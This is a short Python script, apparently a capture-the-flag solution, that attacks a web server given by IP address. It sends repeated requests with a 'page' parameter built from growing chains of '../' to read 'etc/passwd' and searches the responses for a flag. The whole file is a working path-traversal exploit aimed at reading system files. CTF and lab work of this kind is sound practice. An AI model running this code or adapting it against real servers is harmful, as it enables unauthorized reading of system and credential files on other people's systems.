import sys
import requests

def try_directory(path: str, max: int = 20):
    for i in range(max):
        page = '/'.join(['..'] * i) + '/' + path

        response = requests.get(f'http://{sys.argv[1]}/?page={page}')

        script = response.text.partition('\n')[0].split("'")[1::2]
        print(response.url)
        if len(script) > 0 and script[0].find("flag") != -1:
            return script[0]

def main():
    try:
        assert len(sys.argv) == 2, "IP address is not valid."
        
        print(try_directory('etc/passwd', 10))
    except Exception as err:
        print(f'Error: {err}')

if __name__ == "__main__":
    main()